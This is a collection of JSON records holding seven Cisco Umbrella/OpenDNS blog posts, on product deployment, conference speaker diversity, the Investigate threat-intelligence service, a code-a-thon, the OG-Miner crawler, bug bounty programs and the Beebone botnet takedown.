{"website": "Cisco-Umbrella", "title": "The Philosophy of Efficiency: Make the Most of Your Insights Deployment", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/the-philosophy-of-efficiency-make-the-most-of-your-insights-deployment", "abstract": "When it comes to running an IT or security team, efficiency is key. Time saved by not cleaning machines, chasing down users, or other arduous tasks is time that can be spent identifying infections and protecting the network from threats both internal and external. For security professionals in particular, the philosophy of efficiency is baked into their every action, from custom APIs to automated filtering to traffic analysis tools…the list goes on. With so many adversaries and technical challenges facing security professionals, anything that can be automated or otherwise simplified means extra time for more meaningful tasks. Deploying those tools should be simple as well. The ability to have protection up and running on a network without a significant time investment is essential when every second counts. At OpenDNS, we strive to make our products “easy to deploy, and simple to manage,” and there are a few simple steps customers can take to ensure that mantra holds true from the minute a contract is signed: Update Forwarders OpenDNS Insights can be applied in layers to roll out security while minimizing user impact. The quickest win is also one of the first steps in deploying the product: point the forwarders on your internal DNS server to our Anycast IPs (208.67.222.222/208.67.220.220). By pointing the forwarders to these addresses (instead of the virtual appliances), protection goes into effect immediately, even before VAs need to be deployed, and without making changes directly affecting client machines. Although lacking identity-level granularity, this step allows administrators to ensure blanket protection for their networks until they can set up the VA. Deploy the OpenDNS Virtual Appliance Although the topic of deploying two OpenDNS virtual appliances was addressed previously , the topic is worthy of repetition. Our VA gives administrators deeper reporting granularity and provides insight into a network by mapping internal IP addresses to AD (active directory) users and computers. It also forwards external DNS queries from a network to the OpenDNS Global Network . And it’s not enough to deploy one VA. Doubling down on deployment ensures uptime during upgrades and updates—without a second VA, any upgrades would result in 20 minutes of downtime. Another benefit of deploying multiple VAs is high availability. As Marcus Ranum said, “One person’s ‘paranoia’ is another person’s ‘engineering redundancy.’ ” Integrate Domain Controllers and Active Directory Deploying the VA is also a prerequisite for rolling out the Insights AD integration piece. The other two crucial components necessary are registering the network’s domain controllers and deploying the AD Connector . The Connector monitors DCs, listening to user and computer logins and enabling IP-to-user and IP-to-computer mappings on the VAs, essentially tying network and AD events to a human actor or an endpoint. The Connector also assists in importing AD users, groups, and computers to the Umbrella dashboard to provide these mappings. Without these components, the integration will not work properly—and security administrators lose out on the rich data that would otherwise populate the dashboard. Speaking of efficiency, the granular visibility of the AD integration allows security teams to pinpoint problematic users or machines, and remediate infections quicker. It also offers admins the chance to create custom policies for specific users or groups within an organization. These three actions can be rolled out separately, allowing for a testing phase to ensure the product is deployed with the least amount of impact on end users. Potential issues during any step of the process can be addressed immediately, saving time and administrative overhead, while still allowing for general network protection. Update. Deploy. Integrate. Efficient, indeed. For any issues that may arise during deployment, our support team can be reached directly via the dashboard or on twitter .", "date": "2015-05-21"},
{"website": "Cisco-Umbrella", "title": "50% Women Speakers at BSidesNYC", "author": ["Brad Antoniewicz"], "link": "https://umbrella.cisco.com/blog/28103-2", "abstract": "At BSidesNYC we wanted to offer a more inclusive environment for our attendees so we decided a good first step was to set a goal that 50% of our speakers be women. We didn’t make it – but we tried. In this post, I hope to share with you what we did so that maybe your security conference can make it to 50%. Just a couple things to note: We didn’t ask anyone their gender and thus all charts that compare counts of men vs women may be inaccurate. There are many ways to set inclusion goals at conferences, my aim here is not to debate the goal itself, but share what we learned pursuing a goal we felt was right for us. Finally, the opinions expressed here are my own, and don’t necessarily reflect that of my employer, conference organizers, or attendees. A Warm Welcome Our first goal was to offer up a warm welcome to anyone looking at our website. We did this by enlisting supporters, partnering with organizations that shared our views, and creating a welcoming environment. Enlist Amazing Supporters Conferences boil down to the people who attend them and the experiences those attendees have. Before our website had sponsors, speakers, or an agenda, we had a freaking awesome wall of brilliant minds in security – most of which were women. We asked accomplished people within our social circles to sign up as ‘Supporters’ – allowing us to showcase them on our site to draw in a more inclusive crowd. This was intentionally meant to send a clear message to attendees and potential speakers: women are welcome, smart people are here. Supporting Organizations as Partners In the same vein, we also reached out to groups that support women in technology, such as Women’s Society of Cyberjutsu , Women in Security and Privacy , and the Executive Women’s Forum , offering them free promotion for doing nothing other than letting us show support for them at our conference. Start early though, at least one of these partnerships took 4 months of persistent, mostly unanswered emails. Anti-Harassment Policy I’ll never forget the quick request-response I got when I asked one person to be a supporter: Me: Would you want to be a Supporter for BSidesNYC, I think you would really help in encouraging more women to attend. Person: Do you have an anti-harassment policy? I’m not sure if this soon-to-be-supporter meant to imply that they would only join if we had such a policy, but that’s exactly how I took it. This question was an early indicator that we had enlisted a great supporter – our Anti-Harassment/Code of Conduct Policy not only showed that we were creating a safe place for our attendees, it also gave us clear instruction later on when we needed to handle reports of sexual harassment. You absolutely need this. Soliciting CFP Submissions A goal of 50% women speakers is deceptively difficult. No self-respecting conference in security would grant someone a technical speaking slot based on their gender or anything other than their knowledge. This means that in order to achieve the goal, not only do you have to spend time reaching out to women, you have to choose those who’ve done amazing research that will likely be accepted by the Call for Papers (CFP) board. To make things even more of a challenge, if you’re only aware of a particular woman’s incredible research through reading their papers or watching videos of their talks, and not by knowing them, you’ll essentially be forced to cold-call these people and ask them to submit. So that’s what we did – we reached out to over 40 women in the months before BSidesNYC, via Slack, Twitter, Email and LinkedIn. Just to contrast, this is effort we spent soliciting speakers who were men: Finding Women Anyone who tells you they can’t find women speakers in security hasn’t tried looking. Our industry may be grossly unbalanced, but that doesn’t mean we don’t have many extremely talented women. Here’s a few places to find names to search, figure out if they’re in security, and if they’ve done research your audience might like: Search through talks given at all the major prior conferences List of Women Speakers in Tech Women and Tech Follow Friday Tweets like these, they’re really good #FF #womenintech awesome group! @s0ciabl3ng @hexwaxwing @ivydigitalstorm @emilymaxima @apiratemoo @Dinah_Davis @s3scand0r @cybertri_x @InfoSecSherpa @RachelTobac @asbluecio @_Joyous_ More to come next week. #cybersecurity — Marcelle (@marcelle_fsg) January 12, 2018 The Failed Pitch Cold-calling is not easy. Initially my pitch to women who I didn’t know was: Hi! I have a goal to reach 50% women speakers at BSidesNYC, would you consider submitting to the CFP? Keep in mind I didn’t blast this out to just anyone – I researched loads of women and only contacted the ones I thought previously presented on topics our CFP board would accept. My objective with the pitch was to be succinct while perhaps appealing to their willingness to get behind a good goal. Well, it turns out, it is more complicated than that. Don’t Promote the Goal, Just Pursue It Part of the reason we failed to reach our goal was that it took me too long to realize that if you want 50% women speakers, don’t tell anyone about it. Instead relentlessly pursue the goal without mentioning it. That means no public tweets, no DMs, no emails, no “50% women speakers” banners, no lapel pins, nothing. Perhaps unsurprisingly, women (like everyone else) want to be recognized by their technical ability, and not because of their gender. By leading with “I have a goal to reach 50% women speakers”, I was essentially saying “I’m contacting you only because of your gender”. These women had no clue I already vetted them and I was only reaching out because I admired their work. I was too worried about overcoming the challenge of cold-calling that I didn’t realize I was tragically sabotaging myself in the first couple words. Looking back on this DM, I remember interpreting the response as “You are being very to the point” rather then, “You are only asking me because I’m a woman”. Don’t let the same thing happen to you. Take the time to craft a genuine, personalized and meaningful request to each person you asked. No it’s not scalable. Here’s the type of approach I switched to later on, that yielded a much better result: Hi! I absolutely loved your work on XYZ, would you consider submitting to the BSidesNYC CFP? That’s so much better. Although it is hard to say if this new approach was the only deciding factor between these two examples, this person did present at the conference. Extend Your CFP Window We increased the amount of time the CFP was open so that we had more time to raise awareness about the conference. It also gave us a little more time to reach out to potential speakers. The data doesn’t show this had a profound impact on submissions, but I have to believe the extra time helped at least a little. Traditional Problems Still Apply Just because you’ve set this ambitious goal of 50% women speakers, doesn’t exclude the fact that travel can a be barrier, especially when you’re a smaller conference (BSidesNYC had about 630 attendees). Even though attendees and speakers came from all over the world, we had the most success soliciting speakers in the same geographic region as the conference. The Internet is full of strange people, don’t expect everyone to believe you’re genuinely interested furthering inclusion in security. I hate to break it to you, but people might not want to speak at your conference! Sorry! An Unsettling Dose of Reality The more women you reach out to, the more likely you’ll begin to feel how much of a problem sexual harassment really is. The one positive thing that came out of mentioning the goal was women began to explain a little more deeply why they wouldn’t submit: It may not be surprising to the women of our industry, but the latter part of this response totally caught me off guard. Stand Behind Your Goal The exchange in the previous section was a prelude to some of the issues our industry is facing that you might not be expecting. Over the course of planning for the conference we received and handled anonymous reports of sexual harassment, warnings from women about specific people in the industry, and concerns from multiple speakers about individual attendees whose goal might be to threaten the safe space we created. Good thing we had those awesome supporters, they were able to bring a much needed perspective to the mostly male BSidesNYC coordinators. As you pursue your goal, be prepared to revoke tickets, dedicate ‘invisible protection’ for speakers, constantly remind everyone of your anti-harassment policy, issue firm warnings, and be willing to kick someone out of your conference in the spirit of creating a safe place for your attendees. Making/Not Making the Goal In the end, I underestimated how difficult this goal was, started too late, and needed to refine my pitch to women. By the time I figured this all out, the CFP submission period was over. Just by looking at the gender breakdown of the CFP submissions, I knew I didn’t have a chance of making it: Another initiative I championed was the BSidesNYC Entrepreneur Track. Instead of completely ditching this goal, I decided to do whatever I could to still honor the intent of inclusion at our event. There was one important thing to note – since it isn’t a technical track, it isn’t subject to the CFP committee review. I still spent a lot of time researching, selectively choosing the speakers, and individually asking them to participate, but this time it was solely up to me to decide who got a speaking slot. You can see how this played out in the graph below. You have no idea how happy I was during the brief moment that those red and blue lines met, meaning we had reached our goal of 50% women speakers. Cheater! I have to admit, every time we talk about the goal, a part of me feels like we cheated. When the dust settled, 41% of our speakers were women, but this was mostly due to the Entrepreneur Track. If we only compared general tracks, we’d be at 38%. The further you dice it, you begin to see that our smaller size helps us since a single speaker has a bigger percentage impact compared to larger conferences. Other Conferences I began to grow curious how our conference compared to the larger ones. I took the likely flawed (again, no one was asked their gender) approach of looking at BlackHat and ShmooCon ( CFP Metrics and Speakers ), then comparing the two. Looking at this data, perhaps a goal of 50% CFP responses from women might have been better. It’s interesting to see the larger conferences with relatively low percentages. I’d imagine they wouldn’t have the same challenges of getting a balanced CFP response. Speaker Feedback We sent a short survey to some of our speakers asking 4 questions, two of which being: “Do you Identify as a Woman?” and “Why did you submit?”. Eight responded “Yes or Partially” to “Do you identify as a Woman”. This is how those 8 replied to “Why did you submit” (participants could select multiple answers or fill in “other”): It’s such a simple answer: If you want more women speakers at your conference, just create a place they want to speak at 🙂 Inclusion and Encouragement This may be a rationalization, but the positive support from the community and countless people who have went out of their way to thank us for organizing such an inclusive conference leads me to believe that maybe all we needed to do was honor the intent of the goal to help make a tiny step towards progress. A non-inclusive industry is one forcing itself to operate at a diminished capacity. It would be incredible to see other conference organizers setting a goal of 50% women speakers and doing it better than we did. If you’re an organizer, on a review board, a potential speaker, or an attendee, I encourage you to contact the conference [early] and ask them to set inclusive goals. Organizers should also publish their CFP response and acceptance statistics so that as industry we can measure and learn. In the meantime, we’ll work harder to create an awesome conference so that even more people will want to speak at it!", "date": "2018-02-02"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Investigate: Using Good Machines to Fight the Bad Ones", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/opendns-investigate-using-good-machines-to-fight-the-bad-ones", "abstract": "When it comes to new security technologies, Mark Arnold has seen it all. As a board member for OWASP Boston, an advisor to the SOURCE security conference and Director of Information Security at PTC, he regularly evaluates the most cutting-edge new security technologies available. But when Arnold needs the most timely and accurate threat intelligence available, he says that there is one place that he consistently turns. “Investigate is very valuable for our team,” says Arnold. “Firstly, it dissects what DNS actually is — it actually takes the protocol apart — and does it in such a way that our team is able to understand every aspect of it. Also, we know that when the data that Investigate uses becomes stale, it’s removed from the system. We want to know what OpenDNS sees in real-time, and Investigate makes that possible.” “What OpenDNS sees” is the crux of why Arnold and his team are part of a growing number of infosec professionals who are turning to OpenDNS Investigate as a first — or sometimes, last — source of threat intelligence for their day-to-day security operations. And up until now, access to this product OpenDNS’s massive data was only released in limited availability to a few select customers. Today, OpenDNS officially announced that Investigate is generally available to any security professional who, like Arnold, needs better visibility into the global threat landscape with a vantage point that no other security vendor can provide. OpenDNS Investigate is a security search engine that provides query-based and API-driven access to the massive cross-correlated database of domains, IP addresses and autonomous system numbers (ASNs) that the company collects, categorizes and enriches with its own in-house sophisticated models. OpenDNS is continually analyzing terabytes of passive DNS data and BGP routes shared by more than 500 peering partners, combined with its own recursive DNS service — which handles over 70 billion DNS requests per day from more than 50 million active daily users in 160 countries — to assemble one of the largest repositories of network traffic data in the world. But the real value, says Arnold, comes from the next step in the process: the company extracts intelligence from this data using over a dozen models developed by the OpenDNS Security Labs research team. These models range from language-based scoring algorithms like NLPRank that identify likely spear phishing domains to prediction models that replicate specific domain generation algorithms (DGAs) and can catch fast-flux botnet command-and-control servers months before they activate. The resulting dataset not only provides contextual security information, but also reflects the rapidly-changing relationships between domains, IPs, and networks in real-time as an attack unfolds (a stark contrast from other threat intelligence solutions, which typically rely on RSS-like feeds or even emails to provide updates). Investigate provides security teams with a search engine-like interface to this database that can tell them whether a domain or IP is already part of an attack or if it may soon become part of one. “With the Investigate platform, we’re fairly confident that the data that we’re collecting is accurate,” said Arnold, whose company specializes in connected product and Internet of Things (IoT) solutions. “It’s real-time, too, so as we’re clicking around the logs, we know we’re getting context based on data that is fresh as it can possibly be.” The interface provides a variety of human-readable data, such as reputation scores, related domains, connected IP addresses, geographic distribution and attribution data for some known-bad sites. Included in the GA release, OpenDNS has added WHOIS data to its database, giving analysts information about who registered a domain, when and where it was registered (including contact information and any changes over time). Arnold says that while the product can sometimes be an early part of his team’s incident response investigations, it really began to shine after his team began to integrate other systems with the Investigate API. “Our goal is to automate everything we do, because the attackers have already automated their attack ecosystems,” said Arnold. “In manual investigations, when you stumble upon a site that’s hosting large footprints of malware or hosting domains, it’s easy to say ‘this is pretty bad.’ But for us, automating that is key. From a human point of view, you can’t do all of that work in real-time — Investigate gives us a fighting chance to keep up with these adverseries. We already have a threat intelligence platform that we created in-house which uses the Investigate API to make informed decisions about the data in our security ecosystem. It provides an additional level of context for various feeds that we already have in that intelligence platform.” He describes this approach as “using good machines to fight bad machines.” “When we first started using Investigate, we were getting a lot of intelligence from outside PTC, a lot of third-party intelligence,” he said. “We were taking those IOCs and basically submitting them to the Investigate platform to validate what we were seeing in our environment. We aggregate those malicious domains from specific security platforms and then the last level of validation is through Investigate. For our IOCs, it’s the final-final arbiter of truth.” Arnold also notes that he’s found value from integrating Investigate directly with the next-generation endpoint protection solution his company uses in-house. “Our endpoint solution provides a lot of insight from machines that may be participating in DGA-type activity. OpenDNS has a vast amount of information on DGAs. So immediately for us, that was a point of integration between the endpoint and Investigate. We’re able to tie that system into Investigate to correlate what we’re seeing, which gives us greater validation that something was amiss in our network.” The trend for more security solutions to be integrated programmatically can be seen in the gradual shift towards interoperable APIs among security vendors. Other parallels can be seen in the rise of the Internet of Things and connected devices in the enterprise . But even with this move towards automation, Arnold says that the data revealed by Investigate still has value for humans, as well. “I’m drawn to Investigate pretty much on a nightly basis,” he said. “Anywhere in the world where I’m connected, I always find myself logging in.” Want more information on Investigate ? Contact Us Here", "date": "2015-07-22"},
{"website": "Cisco-Umbrella", "title": "Running A Code-A-Thon", "author": ["Dan Hubbard"], "link": "https://umbrella.cisco.com/blog/running-code-a-thon", "abstract": "Last month OpenDNS hosted our own code-a-thon. Since it was such a great experience for our team, we wanted to share insight on our process, as well as a look at what went well and what we’ll be sure to improve on next time. Planning Planning the code-a-thon was pretty simple. We encouraged employees to work on a self-selected project for 24 hours, and only had a few rules: Code-a-Thon starts at 10:00 AM Thursday ends at 10:00 AM Friday You must work in teams of 2 + No posting of code or projects to live servers allowed The project should be somewhat aligned to our space or our company It’s okay to create Open Source tools, but they must be approved before posting publicly After the 24-hour period was up, participants would be asked to demo what they for the rest of the teams. Initially, we opened the Code-a-Thon up to all engineering, operations, research, and product management teams. Selecting Projects and Teams We started promoting the Code-a-Thon internally a few weeks before it kicked off. That gave our team members time  to start thinking about their projects and to brainstorm on teams and ideas. We created a board on Trello that listed project ideas so employees could add themselves to teams, or collaborate. At our weekly company-wide meeting later that week, we announced that plans for a Code-a-Thon were underway. We were pleasantly surprised to find that employees from outside of our technology groups were interested in participating, so we opened up the challenge to everyone. Kick off @10:00 AM Thursday The morning of the Code-A-Thon we gathered all the participants to go over details. I reiterated why we were doing this, the rules of engagement, and shared details on the fuel we’d have available – countless energy drinks, a steady supply of deliveries from favorite local eateries, and plenty of amenities like blankets and toothbrush kits. Teamwork Once we kicked things off, our teams got right into it. Since we have engineers spread out in both our San Francisco headquarters and our Vancouver, Canada office, lots of our teams got started by grabbing a conference room and setting up Google Hangouts. We also had a few last-minute participants, but our team is really collaborative, so it wasn’t an issue for the teams to add another person or two. Many of the teams started and ended with the same project idea, but there were quite a few that changed their ideas after early brainstorming. We even saw movement between the teams during the event, as different projects required different skills. Late afternoon on Day 1 we decided to have an impromptu ping-pong tournament. It was nice to break up some of the coding. Many participants worked through the entire night on their projects, some slept a few hours, and others actually finished early! Luckily it was a very nice night in San Francisco, so some of us worked on the rooftop under the moonlight. At midnight we met on the roof to toast the work that had already been done, and then we quickly got back to our projects. Demos As morning came, the teams starting wrapping up their projects and discussing how they were going to demonstrate what they had accomplished. At 10:00 AM the teams met up to present, and each were given 10-15 minutes to announce their team, what they worked on, and show a demo. We were able to stream the demos for both of our offices, and record them for the people who weren’t able to watch live.  I was impressed to see how excited our crew was to see what others had built, even after many worked throughout the night. We also had a ton of folks from other departments who came out to watch the demos. It was quite amazing what the teams were able to accomplish in just 24 hours. There wasn’t a single team that didn’t finish enough to show a demo. After a few hours the demos wrapped up and we celebrated over a delicious lunch. Employees that participated in the code-a-thon were free to get some final work done, wrap up, and the go home and sleep as needed. Although we didn’t see the Code-a-Thon as a competition, we thought it was important to acknowledge the amazing work that was done. We set up an anonymous survey where participants could vote on the projects. Voting rules were simple: you can’t vote for your own team, and you can only vote once per category.  The categories included hardest technical challenge, most creative, best demo, and best overall project. Retrospective What went well. Teamwork and collaboration across teams. 100% participation from all engineering teams and even some from outside engineering. Quality, quality, quality. The quality of projects that were delivered in just 24 hours was amazing. What did not go well. Not enough whiteboards. We have whiteboards in all of our dozens of conference rooms, as well as several mobile whiteboards, we still needed more! Demo webcast had some problems with streaming. What we can improve upon for next time. Since the Code-a-Thon was a huge success, we definitely will be having more of these for internal employees and we are even thinking about one day inviting outside guests. Some items that we would like to improve for next time are: Give the engineers more advance notice on when we will run the Code-a-Thon Involve more groups across the company (even those who are less technical) to participate. The principles of a Code-a-Thon can be applied across all disciplines. More whiteboards! More sticky notes! Shipping Projects into Code Although we had a rule that no team was allowed to push code into production during the Code-a-Thon,  we are now are in the midst of polishing up some of them and pushing them into production. The first one is two-factor authentication and is available for testing now. Two-factor authentication is becoming more important as credentials theft gets more popular. We will be writing a more complete blog on this feature soon, along with several others we have in the works. Screenshot of two-factor authentication: We highly recommend hosting a Code-a-Thon as a means to create teamwork, excite engineers, and promote innovation. We’ve found that having just a few rules is the surest way to let creativity prevail. If you’ve attended or hosted a Code-a-Thon, be sure to share your experiences in the comments.", "date": "2013-05-29"},
{"website": "Cisco-Umbrella", "title": "OG-Miner: Data Crawling on Steroids", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/og-miner-data-crawling-steroids", "abstract": "The Internet moves fast. New websites are created everyday, new articles are shared through blogs or social media, fresh data is served through APIs, emerging threats are repeatedly setup behind bulletproof and ephemeral infrastructures. Monitoring these online activities is part of the daily job of any security researcher and using the appropriate tools is key to keep the amount of investigation work manageable. At OpenDNS labs, we have been building and using our own custom tools to perform these operations. Today, we are excited to share with you our homemade web crawler / data aggregator called OG-Miner . OG stands for OpenDNS Graph or Open Graphiti (or even Original Gangsta :p ). It is one of our main internal projects and acts as a central part of many analysis and backend processes. Find it on github here . About A little bit of backstory, when we first started working on the OG-Miner several key design features needed to be considered. First of all we were sitting at the top of a huge knowledge base – our “OpenDNS Security Graph” – built from our authoritative and recursive DNS logs. Each piece of data can be accessed through our powerful Investigate API and allows security researchers to retrieve network metrics and features coming from our statistical models. At some point it became clear to us that we had to step back and start studying the topology of the connections built by our algorithms and therefore work with local graphs inside this immense Security Graph . We had to start mining our API data to understand its intrinsic structure. We quickly realized that one of the most practical and simplest ways to crawl our graph data was to implement a customizable Breadth First Traversal. Even if you’re not familiar with graph theory the intuition is pretty straightforward: you start from a given vertex, you explore the neighbors of this node, the neighbors of the neighbors and so on… In essence you iterate on the graph by levels (i.e. depth ). Combined with the adequate graph visualization tool (see OpenGraphiti ), the result was a multitude of beautiful new graph datasets we were eager to decrypt and analyze (Example below). Data visualization is certainly helpful for research but turned out to be a most interesting weapon for our engineering, sales, and marketing department. For the first time, explaining the true nature of our security data and statistical models was a transparent process. Ex: Infrastructure graph extracted from opendns.com (orange node) with a depth of 3 For us this was a new perspective on our intelligence platform. But our data being mostly DNS-centric, the picture was not really complete without enriching our datasets with external APIs or libraries. There are plenty of other great data analytics out there and it would be a shame not to use them. This is the exact moment when we realized we had to go for a modular design to expand the mining capabilities or our tool. Indeed, you can integrate your own plugins to aggregate data, mine APIs or even apply any other sort of computation to your process (Ex: Local libraries, ML/Statistical models, Application monitoring etc.). The current default installation includes plugins for the OpenDNS Investigate API, VirusTotal, Shodan, MaxMind GeoIP, Selenium, HTTP, SSL, DNS and Whois and can very simply be extended. After experimenting and playing with various ideas, we came up with a couple of new fresh innovative detection models and our engine had to be scalable and automatable to fit in a large scale real-time data processing pipeline. We opted for several modern technologies such as ZeroMQ & MongoDB and implemented some graph processing cooperation logic. This way, we were able to build a cluster of graph miners (crawlers / aggregators / processors / explorers…) working in harmony on the same central persistent graph without running into any collision or synchronization issues. These detection models have been running very well for a while now constantly finding and blocking freshly discovered domains. Our engine has reached maturity and we believe the security scene will greatly benefit from this new security tool. We are happy to announce the official opensource release of this fancy new project for the Kaspersky Security Analyst Summit 2017 taking place in the beautiful island of Saint Martin in the Caribbean.", "date": "2017-04-04"},
{"website": "Cisco-Umbrella", "title": "For Fun and Profit: The Right Way to Run a Bug Bounty Program", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/for-fun-and-profit-the-right-way-to-run-a-bug-bounty-program", "abstract": "Here’s to the Crazy Ones As the number of security breaches grows exponentially, and attacks become cheaper and easier to execute, companies are turning to a fascinating community of hackers with ethical fiber. Unlike the malicious hackers who make headlines most often, this breed of–mostly–silent security researchers is motivated to help make the Internet safer for everyone–and make  money while doing so. Crowdsourcing a Safer Netscape In October 1995 Netscape launched a bug bounty program for the shiny new Netscape Navigator 2.0, possibly the first ever documented program of its kind. Prizes ranged from cash to a grab bag of goodies from the Netscape “general store.” Netscape was crowdsourcing before it had a name. The market is a lot bigger now, with many of the largest tech companies in the world offering bug bounty programs. And the stakes are higher as well, with companies like Mozilla paying as much as $10,000 for the most novel bugs . But the fundamental motivations behind them remain the same—mainly that secure coding is difficult, and finding all the holes in a site or product’s security can be nearly impossible for one security team. A Talent Pool of Hackers Many tech giants like Mozilla , Google , Facebook , Github , Yahoo and many others have already realized the value in bug programs and run their own. But for those without the resources to do the same, or those that have the resources but don’t want the headache, services like Bugcrowd, Crowdcurity, and HackerOne are making it easier to get help from a pool of security pros. And while some financially conscious companies might balk at the prospect of paying tens of thousands of dollars to a hacker for a single bug, it’s likely much more attractive than the alternative. IBM’s Cost of Data Breach Study estimates the average cost of a breach at $3.4 million, a 23 percent increase since 2013. Let the Good Guys In Bounty programs can be hugely helpful to a short-staffed security team needing to plug security holes, but going it alone might not be the best way. According to Bugcrowd Founder and CEO Casey Ellis, companies will often try running their own bounty program, then end up turning to a service instead. Ellis says one reason this tends to happen partly because it’s easy to underestimate the overhead of running a program, and the community management aspect of it. “If you get that wrong and end up with a cranky researcher, you’ll have a problem,” he said. Pinterest was one such company that tried going it alone, but quickly became overwhelmed when responses began flowing in, and the social site’s security team enlisted Bugcrowd for help . Ellis said the need for programs in general is on the rise, because with security talent being scarce, and the sheer effort it takes to put out a good product, security is not always top of mind for developers. “Programmers are not really incentivized to program securely,” he said. “It’s really a quality issue, at the end of the day. And quality is hard.” Even Facebook, the modern engineering powerhouse it is, acknowledged this fact . The company’s bounty update from 2013 cites the challenge clearly, “…no matter how much we invest in security–and we invest a lot–we’ll never have all the world’s smartest people on our team and we’ll never be able to think of all the different ways a system as complex as ours might be vulnerable.” LinkedIn has adopted a different approach to help with the noise and quality factors in running a public program, by making it private. The professional networking company announced in a blog post on June 17 that its security team has been running a private bounty program since October 2014 with a community of selected researchers. While the security team still takes bug reports from the public, LinkedIn’s Director of Information Security Cory Scott said that he believes the private model is more apt for a bounty program. “We’ve seen the signal-to-noise ratio of public bug bounty programs continue to degrade,” Scott wrote, “requiring companies to hire dedicated resources, engage consultancies, or use their platform vendor to sift through all of the bug reports to find actionable ones. The spirit of the original bounty programs have been co-opted, and I think an invitation-based model helps bring it back to the original intent.” Do It Right: Prepare, Respond, and Reward Like any community-centric venture, there are right ways to successfully run a bug bounty program, and mistakes that can lead to adverse responses from the research community. Brian Carpenter, a freelance security and malware researcher with decades of experience, knows the nuances of the research community well. He’s a recognized Google and Mozilla hall of fame bug reporter, and has negotiated with a number of companies of varying size and notoriety in reporting bugs. Similar to advice from Bugcrowd’s Ellis, Carpenter says a company’s success with a bounty program can be linked to its preparation, part of which is clearly defining what is “in scope.” “Some of these companies really have no idea what they are getting into, or how badly their networks and websites are coded,” he said. “Quite a few companies have been so overwhelmed by reports that they’ve had to stop taking reports altogether.” A company’s response to reported bugs is often the key turning point between an unknown exploit, and a headline-grabbing security leak. One high profile example goes back to 2013 when a then-unknown Pakistani hacker compromised Mark Zuckerberg’s personal Facebook profile to prove a point when his official bug reports went unanswered. But it’s not just the large tech companies that have made this mistake. In January of 2015, a personal greeting card company, UK-based MoonPig, was outed for a litany of security flaws in its API, which exposed personally identifiable information of its three million users. The developer who found the flaw, Paul Price, wrote in his blog post that he contacted the company 17 months prior to posting about the flaw publicly but received no response after multiple attempts. Not all developers and researchers are so inclined to do the right thing when they feel slighted, unacknowledged, or don’t get paid. Carpenter says for some hackers, it can be a more enticing option to sell a flaw to other hackers who would rather keep it silent and exploit it. “When you’re looking at receiving $10,000 in Bitcoin via the black market compared to a T-shirt and a firm handshake from a Fortune 100 company, you can see why some folks would do that,” Carpenter said. Though he said his long relationship with law enforcement (Carpenter is a former police officer himself) keeps the temptation out of the question for him personally. If A Duplicate, Show Your Work A big pet peeve throughout the bug research community is when companies running a bounty program claim that a flaw that was found is a “dupe” without proving it. Duplicates are a common issue on both sides of a bounty program transaction. A security researcher finds something that looks like gold, only to hear from the company that it’s already been found, and thanks for trying. It’s an issue Vimeo CTO Andrew Pile knows well. “There is a huge amount of trust involved,” he said in an interview with The Verge . “[Researchers] spend a ton of time identifying and documenting these issues, and then the report goes into a black box. I closed out a significant number that were duplicates, and unfortunately we can only pay on a first come, first serve basis.” The frustration could be avoided, Carpenter says, if more companies provided proof that a report is a duplicate. “They just expect you to believe them. I can’t prove that they are doing it to get out of paying, but a reputable company would provide you access to the other bug reports upon request.”", "date": "2015-07-09"},
{"website": "Cisco-Umbrella", "title": "Half the Battle: Sinkholes Are Only the Beginning of a Botnet's End", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/half-the-battle-sinkholes-are-only-the-beginning-of-a-botnets-end", "abstract": "The news agencies and antivirus companies claiming victory over the Beebone botnet are only half right. The difficult effort of stopping the botnet is complete. “ Operation Source ,” as it’s become known, was a mark of success for collaboration between international law enforcement agencies and private security firms like Intel, Kaspersky, and Shadowserver. But, as we’ve seen before with cases like Kelihos, botnets can resurface after a dormant period. While the sinkhole operation was a great success, according to OpenDNS security researcher Mark Nunnikhoven, it is only the first step to ensuring security for those affected by the botnet. The next–and perhaps more crucial–steps are to shutdown the servers involved and clean the infected endpoints. Beebone–or AAEH as it’s also called– reportedly infected more than 12,000 systems across a number of countries worldwide, though the full scope of infections may not be entirely known. Beebone itself is not a destructive virus, however. It is the delivery mechanism for installing malware like keyloggers, banking trojans, and ransomware onto compromised machines. The interagency sinkhole essentially chops the botnet’s capability at its knees. However, unless they have been thoroughly cleaned, the endpoints compromised by Beebone are still very much infected. The sinkhole merely means outbound traffic intended for what were formerly command and control (C&C) IPs will now get dropped. This result is positive. It means those infected machines will no longer receive instructions from a malicious server–for now. “Due to the takedown, these devices are now receiving a benign response, but they still need to be disinfected,” Nunnikhoven wrote in a blog post. “The US-Cert has published links to cleanup tools for various systems that can help with these efforts.” Analysis from OpenDNS shows traffic requests to these formerly malicious domains are still at very high levels. “What we’re seeing through our global viewpoint of DNS traffic is requests to the various botnet domains have not dropped significantly since the takedown on April 9th,” Nunnikhoven said. “The continued significant traffic to these domains suggests that cleanup efforts have not been effective yet.” Unless infected systems are cleaned, hackers responsible for Beebone can essentially pick up where they left off if they included an IP update mechanism with the malware they used. But the cleanup can be incredibly tricky. The collaborative effort to sinkhole such a massive interconnected system of compromised servers is a huge undertaking. But the effort required to individually clean all the machines infected by the Beebone malware is even larger. Dhia Mahjoub, senior security researcher at OpenDNS, has spent a great amount of time researching botnets like Kelihos and Zbot, which have similar characteristics to Beebone. And he’s fully aware of the challenges involved with stopping them. “Sinkholes are good for telemetry, which will measure the extent of the threat,” he said. “Step two is for law enforcement to actually take down the involved servers, and to clean the endpoint machines.” But the last part is the most difficult, as it involves finding all the infected machines and somehow communicating to their users that they have been infected and need cleaning. “Cleanup is incredibly difficult because the burden lies on the individuals using infected machines, or their ISPs,” Mahjoub said. “It’s a huge effort and very expensive. But without it, botnets can potentially pick up where they left off.”", "date": "2015-04-13"},
